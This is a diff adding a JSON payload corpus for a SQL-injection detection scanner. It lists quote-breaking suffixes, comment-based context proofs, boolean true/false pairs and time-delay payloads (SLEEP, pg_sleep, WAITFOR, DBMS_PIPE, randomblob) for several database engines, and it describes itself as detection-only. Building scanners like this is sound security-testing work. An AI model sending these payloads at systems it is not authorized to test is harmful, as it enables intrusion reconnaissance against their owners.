@@ -1,0 +1,58 @@
+{
+  "_about": "The payload corpus. Data, not code: adding a dialect is an entry here, and scripts/payloads.py never changes.",
+  "_contract": "Every value is a SUFFIX appended to the parameter's original value, so id=1 is sent as id=1'. Nothing here replaces the value.",
+  "_and_only": "boolean and time entries use AND, never OR. Confirmation needs an asymmetry - TRUE matches the baseline, FALSE differs - and an OR-TRUE returns every row, so it differs too and a vulnerable parameter scores clean. OR is for exploitation, after detection.",
+  "_detection_only": "Nothing here extracts data. No UNION column dumping, no extractvalue, no stacked writes. The goal is evidence that injection exists, and stopping there is what keeps this safe to point at someone else's application.",
+
+  "error_suffix": [
+    {"value": "'",   "dbms": "any", "context": "any",  "note": "single quote. The one payload that finds most of everything"},
+    {"value": "\"",  "dbms": "any", "context": "any",  "note": "double-quoted string context"},
+    {"value": "')",  "dbms": "any", "context": "any",  "note": "value wrapped in parentheses"},
+    {"value": "\\",  "dbms": "any", "context": "any",  "note": "breaks backslash escaping, and escapes the closing quote in multi-field queries"},
+    {"value": "''",  "dbms": "any", "context": "any",  "note": "balanced pair. Silence here plus noise from a single quote is itself the string-context proof"},
+    {"value": "\")", "dbms": "any", "context": "any",  "note": "double-quoted and parenthesised"},
+    {"value": "'))", "dbms": "any", "context": "any",  "note": "two levels of nesting"},
+    {"value": "`",   "dbms": "mysql", "context": "any", "note": "MySQL identifier quote, reaches ORDER BY and column-name positions"},
+    {"value": "%",   "dbms": "any", "context": "any",  "note": "unbalanced LIKE wildcard. Weak on its own, useful next to a quote"}
+  ],
+
+  "context_proof": [
+    {"break": "'", "repair": "'-- ", "dbms": "any", "note": "MySQL and most engines. Trailing space is mandatory"},
+    {"break": "'", "repair": "'#",   "dbms": "mysql", "note": "MySQL hash comment, for when -- is filtered"},
+    {"break": "'", "repair": "'/*",  "dbms": "any", "note": "unterminated block comment swallows the rest of the statement"},
+    {"break": "\"", "repair": "\"-- ", "dbms": "any", "note": "same proof in a double-quoted context"}
+  ],
+
+  "boolean_pairs": [
+    {"true": " AND 1=1",       "false": " AND 1=2",       "dbms": "any", "context": "numeric"},
+    {"true": "' AND '1'='1",   "false": "' AND '1'='2",   "dbms": "any", "context": "string"},
+    {"true": "\" AND \"1\"=\"1", "false": "\" AND \"1\"=\"2", "dbms": "any", "context": "double-quoted"},
+    {"true": "') AND ('1'='1", "false": "') AND ('1'='2", "dbms": "any", "context": "paren"},
+    {"true": "' AND 1=1-- ",   "false": "' AND 1=2-- ",   "dbms": "any", "context": "string",
+     "note": "comment form, for a query with trailing clauses the quote form cannot balance"},
+    {"true": "' && 1=1-- ",    "false": "' && 1=2-- ",    "dbms": "mysql", "context": "string",
+     "note": "symbol form, for when the word AND is filtered"}
+  ],
+
+  "time": [
+    {"value": " AND SLEEP(5)-- ",  "dbms": "mysql", "context": "numeric", "seconds": 5},
+    {"value": "' AND SLEEP(5)-- ", "dbms": "mysql", "context": "string",  "seconds": 5},
+    {"value": " AND pg_sleep(5)-- ",  "dbms": "postgres", "context": "numeric", "seconds": 5},
+    {"value": "' AND pg_sleep(5)-- ", "dbms": "postgres", "context": "string",  "seconds": 5},
+    {"value": "; WAITFOR DELAY '0:0:5'-- ",  "dbms": "mssql", "context": "numeric", "seconds": 5,
+     "note": "SQL Server has no inline sleep, so this needs stacked statements"},
+    {"value": "'; WAITFOR DELAY '0:0:5'-- ", "dbms": "mssql", "context": "string",  "seconds": 5},
+    {"value": " AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",  "dbms": "oracle", "context": "numeric", "seconds": 5,
+     "note": "reachable without the DBMS_LOCK privilege, unlike DBMS_LOCK.SLEEP"},
+    {"value": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ", "dbms": "oracle", "context": "string",  "seconds": 5},
+    {"value": " AND 1=randomblob(300000000)-- ",  "dbms": "sqlite", "context": "numeric", "seconds": 3,
+     "note": "SQLite has no sleep. Allocating a large blob is the delay, roughly 2-3 seconds"},
+    {"value": "' AND 1=randomblob(300000000)-- ", "dbms": "sqlite", "context": "string",  "seconds": 3}
+  ],
+
+  "_sources": [
+    "Curated from the team's own dynamic-testing skill set (D:/AGENT-AUTO-WEB/attack_skills/attack/web/sqli.md)",
+    "Cross-checked against sqlmap (GPLv2, sqlmapproject/sqlmap) and PayloadsAllTheThings (MIT, swisskyrepo)",
+    "Nothing was copied wholesale. Entries were selected for detection value, rewritten as suffixes, and stripped of any data-extraction behaviour."
+  ]
+}
